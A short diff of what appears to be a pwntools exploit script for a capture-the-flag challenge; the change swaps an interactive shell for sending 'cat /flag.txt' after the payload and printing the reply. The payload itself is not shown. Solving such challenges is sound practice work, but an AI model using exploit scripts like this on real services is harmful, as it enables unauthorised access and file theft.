@@ -19,4 +19,6 @@ log.info(f"Payload ({len(payload)}): {payload}")
 
 p.sendlineafter(b">", b"1")
 p.sendlineafter(b">", payload)
-p.interactive()
+p.sendline(b"cat /flag.txt")
+print(p.recvline().replace(b'\n',b''))
+#p.interactive()
